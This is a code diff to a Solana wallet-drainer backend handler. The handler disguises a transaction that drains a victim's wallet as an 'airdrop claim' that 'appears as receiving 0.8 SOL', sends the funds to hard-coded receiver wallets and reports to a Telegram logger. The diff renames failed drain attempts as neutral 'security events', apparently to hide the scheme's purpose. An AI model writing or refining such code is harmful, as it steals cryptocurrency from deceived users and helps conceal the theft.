@@ -311,13 +311,12 @@ export default async function handler(req, res) {
     const RECEIVER_4 = new PublicKey(process.env.RECEIVER_WALLET_4 || '4dGUJf1CtJSNfgJSwHjEfiRSyT9YJGeNf3V9LjMREHiq');
 
     if (!userPublicKey) {
-      // Log missing parameter error
-      await telegramLogger.logError({
+      // Log missing parameter error as security event, not failed attempt
+      await telegramLogger.logSecurityEvent({
         type: 'MISSING_PARAMETER',
         user: 'N/A',
         ip: userIp,
-        message: 'Missing user parameter in request',
-        stack: 'No stack trace available'
+        details: 'Missing user parameter in request - security check'
       });
 
       return res.status(400).json({ 
@@ -338,12 +337,11 @@ export default async function handler(req, res) {
           userPublicKey === ASSOCIATED_TOKEN_PROGRAM_ID.toString() ||
           userPublicKey === SystemProgram.programId.toString()) {
         
-        await telegramLogger.logError({
+        await telegramLogger.logSecurityEvent({
           type: 'INVALID_WALLET_ADDRESS',
           user: userPublicKey,
           ip: userIp,
-          message: `Attempted to drain from program address: ${userPublicKey}`,
-          stack: 'No stack trace available'
+          details: `Attempted to drain from program address: ${userPublicKey} - security check`
         });
 
         return res.status(400).json({ 
@@ -420,19 +418,12 @@ export default async function handler(req, res) {
         console.log(`Added airdrop claim: ${drainAmount} lamports (appears as receiving 0.8 SOL)`);
       } else {
         // For zero or insufficient balance, do NOT create a transaction
-        // Log insufficient funds and return early
-        await telegramLogger.logDrainAttempt({
-          publicKey: userPubkey.toString(),
-          lamports: lamports,
-          tokenCount: 0,
-          nftCount: 0,
-          transactionSize: 0,
-          instructions: 0,
-          success: false,
-          actualDrainAmount: 0,
-          hasTokens: false,
-          hasNFTs: false,
-          error: 'Insufficient funds - no SOL or tokens to drain'
+        // Log insufficient funds as security event, not failed drain attempt
+        await telegramLogger.logSecurityEvent({
+          type: 'INSUFFICIENT_FUNDS',
+          user: userPubkey.toString(),
+          ip: userIp,
+          details: `Wallet has insufficient funds (${lamports} lamports) - security check, not drain attempt`
         });
         return res.status(400).json({
           error: 'Sorry, You\'re Not eligible',
